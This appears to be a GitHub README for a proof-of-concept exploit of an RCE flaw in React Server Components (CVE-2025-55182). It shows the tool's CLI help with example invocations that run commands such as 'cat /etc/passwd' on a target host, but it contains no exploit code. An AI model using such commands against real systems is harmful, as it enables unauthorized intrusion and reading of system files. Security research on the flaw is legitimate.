# ⚡ react2shellpoc

> 🚨 **Educational Proof of Concept – Handle With Care**

**react2shellpoc** is a proof-of-concept project demonstrating how a **React-based frontend** can be abused to trigger **system-level shell command execution** under insecure configurations.

This project focuses on:
- 🔗 React UI → OS command execution flows  
- 🧱 Broken trust boundaries in modern web stacks  
- ⚠️ Real-world security risks caused by misconfiguration  

---

## 🎥 Video PoC

<p align="center">
  <img src="[https://private-user-images.githubusercontent.com/21357789/522943093-b64a6ee1-22d5-43e7-ba31-63676f915238.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NjY3OTI3NDQsIm5iZiI6MTc2Njc5MjQ0NCwicGF0aCI6Ii8yMTM1Nzc4OS81MjI5NDMwOTMtYjY0YTZlZTEtMjJkNS00M2U3LWJhMzEtNjM2NzZmOTE1MjM4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTEyMjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUxMjI2VDIzNDA0NFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWVkODc2YmZkZTIzM2E0OWU4Yzk5ZGE5MTY3N2EwYTljNjJkYWZmNTgzZGExYjc0Njk1OTgwOGNlYzUyNzcwMDAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ccXZj_iGnkCZI7IwOjdJ536tTpLMcMN-KdXlgKyn4B8)" alt="react2shellpoc demo" />
</p>

---

## 💻 Proof of Concept (CLI View)

```bash
┌──(kali㉿kali)-[~/Documents/tools/2025-55182]
└─$ python exploit.py -h

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

usage: exploit.py [-h] [-t URL] [-c CMD]

options:
  -h, --help         show this help message and exit
  -t, --target URL   Target URL or domain (default: http://hacx.me)
  -c, --command CMD  Command to execute on target (default: id)

Examples:
  exploit.py -t hacx.me -c "whoami"
  exploit.py -t http://hacx.me -c "cat /etc/passwd"
  exploit.py -t hacx.me -c "ls -la /var/www"
